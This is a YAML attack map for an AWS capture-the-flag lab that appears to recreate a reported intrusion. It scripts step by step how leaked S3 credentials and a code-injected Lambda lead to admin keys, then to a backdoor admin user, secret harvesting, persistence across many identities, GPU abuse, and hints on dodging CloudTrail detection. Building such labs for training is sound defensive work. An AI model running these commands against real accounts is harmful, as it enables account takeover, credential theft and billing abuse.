attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-8min-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could have been
        obtained through many real-world vectors: phishing a developer and gaining access to their
        workstation, compromising a browser session, exploiting a vulnerable workload running in
        this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded
        in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.

        This IAM user — pl-prod-8min-starting-user — has a narrow set of permissions: it can list
        the contents of one specific S3 bucket and download objects from it. That bucket is a
        private RAG (Retrieval Augmented Generation) data store used by an internal ML pipeline.
        The permissions look innocuous, but the data inside the bucket is anything but.

    - id: rag-bucket
      label: "RAG Data Bucket"
      type: resource
      subType: s3-bucket
      arn: "arn:aws:s3:::pl-prod-8min-rag-data-{account_id}-{suffix}"
      description: >
        This private S3 bucket stores RAG pipeline data — chunked documents, embeddings, and
        pipeline configuration files used by the ML workload. The bucket is not publicly accessible,
        but one of its configuration files contains IAM credentials that were embedded by a developer
        who needed the pipeline to authenticate to another service.

        The file config/rag-pipeline-config.json contains a JSON blob with a plaintext AWS
        access key ID and secret access key for pl-prod-8min-compromised-user. This is the
        credential style that Amazon Macie and secrets scanners are built to detect.

    - id: compromised-user
      label: "Compromised User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-8min-compromised-user"
      description: >
        pl-prod-8min-compromised-user is a service account with permissions typical of a pipeline
        operator: it can list and invoke Lambda functions, enumerate IAM users and roles, list
        Bedrock models, discover SSM parameters and Secrets Manager secrets, and assume several
        low-privilege roles. On its own, none of these permissions are alarming.

        The danger is that this account can also update and invoke the pl-prod-8min-ec2-init
        Lambda function — a function whose execution role holds iam:CreateAccessKey on
        pl-prod-8min-frick, the account's admin user. Lambda write access combined with a
        privileged execution role is a one-hop privilege escalation path.

    - id: ec2-init-lambda
      label: "EC2 Init Lambda"
      type: resource
      subType: lambda-function
      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-8min-ec2-init"
      description: >
        pl-prod-8min-ec2-init is a Lambda function originally written to initialize EC2 instances
        as part of an internal provisioning workflow. Its execution role — pl-prod-8min-ec2-init-role
        — accumulated permissions over time as the team added EC2 initialization tasks. At some point
        someone added iam:CreateAccessKey on pl-prod-8min-frick to support a rotation workflow that
        was later abandoned. The permission was never removed.

        The function's code is entirely replaceable by any principal with lambda:UpdateFunctionCode.
        Once the code is replaced, any call to lambda:InvokeFunction executes the new code under the
        execution role's identity — giving the caller access to all permissions that role holds.

        First injection attempt: the demo targets pl-prod-8min-admingh (a decoy user the execution
        role can also create keys for). The invocation succeeds but the keys produced have no useful
        permissions. Second injection: the demo targets pl-prod-8min-frick. Success.

    - id: ec2-init-role
      label: "EC2 Init Execution Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{account_id}:role/pl-prod-8min-ec2-init-role"
      description: >
        pl-prod-8min-ec2-init-role is the IAM execution role attached to the pl-prod-8min-ec2-init
        Lambda function. When the Lambda is invoked, it assumes this role's identity and inherits
        all of its permissions. Over time, the role accumulated permissions beyond its original
        EC2 initialization purpose — including iam:CreateAccessKey on both pl-prod-8min-admingh
        (a decoy user) and pl-prod-8min-frick (the account's admin user). This over-permissioned
        execution role is the linchpin of the privilege escalation: without it, injecting code into
        the Lambda function would be useless.

    - id: frick-admin-user
      label: "Admin User (frick)"
      type: principal
      subType: iam-user
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:user/pl-prod-8min-frick"
      description: >
        pl-prod-8min-frick is the account's administrative IAM user with AdministratorAccess
        attached. By creating access keys for this user via the Lambda injection, the attacker
        gains full administrative control of the AWS account.

        With frick's credentials the attacker can create backdoor accounts, access all secrets and
        parameters, invoke Bedrock models, and — as happened in the original attack — launch GPU
        instances for ML model training at the account owner's expense.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin"
      description: >
        The CTF flag is stored in SSM Parameter Store at
        /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin. It is readable only
        by principals with ssm:GetParameter on that path — which requires administrative
        access. Retrieving this parameter confirms you have successfully escalated to admin
        via pl-prod-8min-frick and completes the scenario objective.

    - id: persistence-identities
      label: "Persistence Identities"
      type: collection
      isTarget: true
      description: >
        After gaining admin access, the attacker spreads across multiple principals to
        complicate detection and ensure persistence. The blog documents 19 unique AWS
        principals: 5 IAM roles assumed across 12 sessions (sysadmin, account, netadmin
        with sessions explore/test/pwned; sysadmin with escalation; developer and external
        with test), plus access keys created for 5 pre-existing IAM users (rocker with
        BedrockFullAccess, azureadmanager for Azure AD integration, deploy-svc, monitoring,
        ci-runner), and one newly created backdoor-admin user with AdministratorAccess.

        This distribution ensures the attacker only needs one surviving principal to
        maintain access. Even if frick's credentials are rotated, any of the other
        compromised users or assumed role sessions can be used to re-establish full control.

  edges:
    - from: starting-user
      to: rag-bucket
      label: "s3:ListBucket + s3:GetObject"
      description: >
        Use the starting user's S3 permissions to enumerate the RAG bucket and download
        the pipeline configuration file that contains embedded IAM credentials.
      commands:
        - description: "List the bucket contents to find the credentials file"
          command: "aws s3 ls s3://pl-prod-8min-rag-data-{account_id}-{suffix} --recursive"
        - description: "Download the RAG pipeline config file"
          command: "aws s3 cp s3://pl-prod-8min-rag-data-{account_id}-{suffix}/config/rag-pipeline-config.json /tmp/rag-pipeline-config.json"
        - description: "Extract the embedded credentials"
          command: "cat /tmp/rag-pipeline-config.json | jq '{access_key: .pipeline_auth.aws_access_key_id, secret_key: .pipeline_auth.aws_secret_access_key}'"
      hints:
        - "Your starting user has read access to an S3 bucket. Enumerate its contents — data pipeline buckets often contain configuration files that developers embed credentials in for convenience."
        - "Use s3:ListBucket to see what files exist in the bucket. Look for configuration or settings files at any path depth."
        - "Once you find a configuration file, download it and look for any AWS credential fields — access key IDs start with AKIA or ASIA."
        - "Pipeline configuration files often contain credentials embedded as JSON fields with names like aws_access_key_id, access_key, or similar variations."
        - "After extracting the credentials, test them with sts:GetCallerIdentity to identify the new principal before proceeding."

    - from: rag-bucket
      to: compromised-user
      label: "Credential extraction"
      description: >
        Parse the downloaded config file to extract the plaintext IAM access key ID and secret
        for pl-prod-8min-compromised-user, then configure those credentials for use.
      commands:
        - description: "Set the compromised user credentials"
          command: "export AWS_ACCESS_KEY_ID=$(cat /tmp/rag-pipeline-config.json | jq -r '.pipeline_auth.aws_access_key_id')\nexport AWS_SECRET_ACCESS_KEY=$(cat /tmp/rag-pipeline-config.json | jq -r '.pipeline_auth.aws_secret_access_key')\nunset AWS_SESSION_TOKEN"
        - description: "Verify the new identity"
          command: "aws sts get-caller-identity"
        - description: "Enumerate IAM users to find high-value targets"
          command: "aws iam list-users --query 'Users[*].[UserName,Arn]' --output table"
        - description: "Identify admin users by checking attached policies"
          command: "aws iam list-attached-user-policies --user-name pl-prod-8min-frick"
        - description: "Enumerate Lambda functions"
          command: "aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table"
        - description: "Inspect the ec2-init Lambda execution role"
          command: "aws lambda get-function --function-name pl-prod-8min-ec2-init --query 'Configuration.[FunctionName,Role]'"
        - description: "Check what permissions the execution role holds"
          command: "aws iam get-role --role-name pl-prod-8min-ec2-init-role"
        - description: "Attempt role assumptions — admin/Administrator fail, others succeed"
          command: "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/admin --role-session-name test 2>&1 || echo 'FAILED as expected'\naws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role --role-session-name recon"
      hints:
        - "You now have credentials for a more capable user. Start with sts:GetCallerIdentity to confirm your new identity, then enumerate your environment methodically."
        - "Use iam:ListUsers to discover all users in the account. Look for usernames that suggest administrative roles — the original attacker specifically searched for admin-sounding names."
        - "For each interesting user, use iam:ListAttachedUserPolicies to check if they have AdministratorAccess or other broad policies attached."
        - "Use lambda:ListFunctions to discover what Lambda functions exist. Pay close attention to the Role field — a Lambda whose execution role name suggests system-level access is worth investigating further."
        - "Use lambda:GetFunction on interesting functions to see their full configuration, including the execution role ARN. Then use iam:GetRole to inspect what that role's trust policy and permissions look like."
        - "Try assuming roles in the account. Failed assumptions (for roles like 'admin' or 'Administrator') narrow down where not to focus. Successful assumptions expand your visibility for reconnaissance."

    - from: compromised-user
      to: ec2-init-lambda
      label: "lambda:UpdateFunctionCode + lambda:UpdateFunctionConfiguration"
      description: >
        Replace the Lambda function's code with a malicious handler that calls iam:CreateAccessKey
        on a target user specified via environment variable, then set the initial target username.
        The compromised user has lambda:UpdateFunctionCode, lambda:UpdateFunctionConfiguration,
        and lambda:InvokeFunction — full control over the function's behavior.
      commands:
        - description: "Write the malicious Lambda handler"
          command: "cat > /tmp/lambda_payload.py << 'EOF'\nimport boto3\nimport os\n\ndef handler(event, context):\n    target = os.environ.get('TARGET_USER', '')\n    iam = boto3.client('iam')\n    response = iam.create_access_key(UserName=target)\n    key = response['AccessKey']\n    return {\n        'AccessKeyId': key['AccessKeyId'],\n        'SecretAccessKey': key['SecretAccessKey'],\n        'UserName': key['UserName']\n    }\nEOF"
        - description: "Package the handler"
          command: "cd /tmp && zip lambda_payload.zip lambda_payload.py"
        - description: "Upload the malicious handler to the Lambda function"
          command: "aws lambda update-function-code \\\n  --function-name pl-prod-8min-ec2-init \\\n  --zip-file fileb:///tmp/lambda_payload.zip"
        - description: "Set the target environment variable to admingh"
          command: "aws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-admingh}'"
      hints:
        - "You have lambda:UpdateFunctionCode and lambda:InvokeFunction on pl-prod-8min-ec2-init. The function's execution role can create access keys for IAM users. Think about what you can do by replacing the function's code."
        - "Write a Python Lambda handler that calls boto3's iam.create_access_key() with a target username. The handler will execute with the permissions of the Lambda execution role — not your current user."
        - "Zip the handler, upload it with lambda:UpdateFunctionCode, then use lambda:UpdateFunctionConfiguration to set an environment variable with the target username. This avoids hardcoding the target in the zip."

    - from: ec2-init-lambda
      to: ec2-init-role
      label: "Assumes execution role on invocation"
      description: >
        When the Lambda function is invoked, AWS automatically assumes the attached execution
        role (pl-prod-8min-ec2-init-role). The injected code now runs with the role's full
        permission set — including iam:CreateAccessKey on pl-prod-8min-admingh and
        pl-prod-8min-frick. This is the pivot point: the attacker's code, executing under a
        privileged role, can perform actions the compromised user never could directly.

        The first invocation targets pl-prod-8min-admingh. Key creation succeeds but the
        returned credentials have no useful permissions — admingh is a decoy. The second
        invocation targets pl-prod-8min-frick, the account's admin user.
      commands:
        - description: "Invoke with admingh — keys created but admingh has no useful permissions"
          command: "aws lambda invoke \\\n  --function-name pl-prod-8min-ec2-init \\\n  --payload '{}' \\\n  /tmp/lambda_response_admingh.json\ncat /tmp/lambda_response_admingh.json"
        - description: "Retarget to frick (admin user)"
          command: "aws lambda update-function-configuration \\\n  --function-name pl-prod-8min-ec2-init \\\n  --environment 'Variables={TARGET_USER=pl-prod-8min-frick}'"
        - description: "Invoke with frick — admin access keys returned"
          command: "aws lambda invoke \\\n  --function-name pl-prod-8min-ec2-init \\\n  --payload '{}' \\\n  /tmp/lambda_response_frick.json\ncat /tmp/lambda_response_frick.json"
      hints:
        - "The Lambda's execution role is what gives the injected code its power. The attacker's own user cannot call iam:CreateAccessKey directly, but the execution role can."
        - "Your first target might not have useful permissions even if key creation succeeds — the execution role can create keys for multiple users. Target the admin user."
        - "After invoking the function, parse the JSON response to extract the AccessKeyId and SecretAccessKey."

    - from: ec2-init-role
      to: frick-admin-user
      label: "iam:CreateAccessKey"
      description: >
        The injected Lambda code, executing as pl-prod-8min-ec2-init-role, calls
        iam:CreateAccessKey for pl-prod-8min-frick. The returned credentials grant full
        AdministratorAccess. The attacker then creates a backdoor IAM user, creates access keys
        for rocker (Bedrock persistence), invokes Bedrock models, attempts cross-account movement
        (all fail), collects secrets and parameters, and launches a GPU instance.
      commands:
        - description: "Configure frick's admin credentials"
          command: "export AWS_ACCESS_KEY_ID=$(cat /tmp/lambda_response_frick.json | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(cat /tmp/lambda_response_frick.json | jq -r '.SecretAccessKey')\nunset AWS_SESSION_TOKEN"
        - description: "Verify admin access"
          command: "aws sts get-caller-identity\naws iam list-users --output table"
        - description: "Create persistent backdoor IAM user"
          command: "aws iam create-user --user-name backdoor-admin\naws iam attach-user-policy \\\n  --user-name backdoor-admin \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name backdoor-admin"
        - description: "Create access keys for rocker (Bedrock persistence)"
          command: "aws iam create-access-key --user-name pl-prod-8min-rocker"
        - description: "Invoke Bedrock models (check logging first)"
          command: "aws bedrock get-model-invocation-logging-configuration\naws bedrock list-foundation-models --query 'modelSummaries[?contains(modelId, `claude`) || contains(modelId, `nova`) || contains(modelId, `deepseek`)].[modelId]' --output table"
        - description: "Invoke Claude Haiku"
          command: "aws bedrock-runtime invoke-model \\\n  --model-id anthropic.claude-haiku-20240307-v1:0 \\\n  --body '{\"anthropic_version\":\"bedrock-2023-05-31\",\"max_tokens\":100,\"messages\":[{\"role\":\"user\",\"content\":\"What is AWS IAM?\"}]}' \\\n  --cli-binary-format raw-in-base64-out \\\n  /tmp/bedrock_response.json"
        - description: "Attempt cross-account role assumption (will fail — hallucinated account IDs)"
          command: "aws sts assume-role \\\n  --role-arn arn:aws:iam::123456789012:role/OrganizationAccountAccessRole \\\n  --role-session-name cross-account-attempt 2>&1 || echo 'AccessDenied — cross-account target does not exist'"
        - description: "Collect secrets and parameters"
          command: "aws secretsmanager get-secret-value --secret-id pl-prod-8min-db-credentials --query 'SecretString'\naws ssm get-parameter --name /pl/8min/api-key --with-decryption --query 'Parameter.Value'"
        - description: "Launch GPU instance (p3.2xlarge) with 2-hour auto-shutdown"
          command: "aws ec2 create-key-pair --key-name pl-8min-attack-key --query 'KeyMaterial' --output text > /tmp/pl-8min-attack-key.pem\nSG_ID=$(aws ec2 create-security-group \\\n  --group-name pl-8min-attack-sg \\\n  --description 'Attack GPU instance SG' \\\n  --query 'GroupId' --output text)\naws ec2 authorize-security-group-ingress \\\n  --group-id $SG_ID \\\n  --protocol tcp --port 22 --cidr 0.0.0.0/0\naws ec2 run-instances \\\n  --image-id ami-0c02fb55956c7d316 \\\n  --instance-type p3.2xlarge \\\n  --key-name pl-8min-attack-key \\\n  --security-group-ids $SG_ID \\\n  --user-data 'IyEvYmluL2Jhc2gKc2h1dGRvd24gLWggKzEyMA==' \\\n  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pl-8min-gpu}]'"
      hints:
        - "You now have access keys for frick — an admin user. Start by verifying the identity and confirming full access, then focus on establishing persistence before doing anything else."
        - "Create a backdoor IAM user with AdministratorAccess as a persistent foothold. This mirrors what the original attacker did: create a new user + attach AdministratorAccess in rapid succession."
        - "The account has Bedrock-enabled users. Check whether Bedrock model invocation logging is enabled before invoking models — the original attacker checked this to assess detection risk."
        - "After collecting credentials and data, the original attacker launched a GPU instance for ML model training. The instance type matters: p-series instances are GPU-accelerated and expensive. Always terminate GPU instances immediately after demo."
        - "Cross-account role assumption will fail — the original attack included attempts against hallucinated account IDs that all returned AccessDenied. Run the attempts to replicate the attack fidelity, then continue with data collection."

    - from: frick-admin-user
      to: persistence-identities
      label: "sts:AssumeRole + iam:CreateAccessKey + iam:CreateUser"
      description: >
        With AdministratorAccess, the attacker spreads across the account's identity
        landscape. They assume 5 IAM roles across 12 sessions using varied session names
        (explore, test, pwned, escalation) to distribute CloudTrail activity across
        principals. They create access keys for 5 pre-existing users (rocker, azureadmanager,
        deploy-svc, monitoring, ci-runner) and create a new backdoor-admin user with
        AdministratorAccess attached. This yields 19 unique principal identities — any one
        of which can be used to regain full access if the others are revoked.
      commands:
        - description: "Assume roles with varied session names (representative sample)"
          command: "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-sysadmin-role --role-session-name explore\naws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-netadmin-role --role-session-name pwned\naws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-8min-external-role --role-session-name test"
        - description: "Create access keys for pre-existing users"
          command: "aws iam create-access-key --user-name pl-prod-8min-rocker\naws iam create-access-key --user-name pl-prod-8min-azureadmanager\naws iam create-access-key --user-name pl-prod-8min-deploy-svc\naws iam create-access-key --user-name pl-prod-8min-monitoring\naws iam create-access-key --user-name pl-prod-8min-ci-runner"
        - description: "Create backdoor admin user with persistent access"
          command: "aws iam create-user --user-name backdoor-admin\naws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name backdoor-admin"
      hints:
        - "After gaining admin, the priority is persistence. Spread across as many identities as possible so that revoking one doesn't cut off access."
        - "Assume roles with different session names to distribute CloudTrail entries — this makes incident response harder because the same role appears under multiple session identifiers."
        - "Create access keys for pre-existing service accounts. These are less likely to trigger alerts than newly created users because the accounts already have established usage patterns."

    - from: frick-admin-user
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        Read the CTF flag from SSM Parameter Store using the admin credentials obtained via
        Lambda injection. This confirms full administrative access has been achieved and
        completes the scenario objective.
      commands:
        - description: "Read the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin --query Parameter.Value --output text"
      hints:
        - "You have admin credentials for pl-prod-8min-frick. Use ssm:GetParameter to read the flag stored at /pathfinding-labs/flags/sysdig-8-minutes-to-admin-to-admin."
